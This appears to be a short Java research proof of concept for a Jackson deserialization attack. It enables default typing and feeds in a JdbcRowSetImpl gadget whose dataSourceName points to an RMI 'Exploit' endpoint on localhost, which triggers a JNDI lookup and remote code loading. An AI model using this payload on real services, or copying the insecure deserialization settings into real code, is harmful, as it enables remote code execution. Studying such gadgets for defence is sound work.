package com.devsec.research.deserialization;

import com.fasterxml.jackson.databind.ObjectMapper;

public class JacksonJNDI {

	public static void main(String[] args) {
		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        String payload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"rmi://localhost:2099/Exploit\",\"autoCommit\":true}]";
        System.out.println(payload);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
        	mapper.readValue(payload, Object.class);
            System.out.println("Should not pass");
        } catch (Throwable e) {
            e.printStackTrace();
        }
	}
}
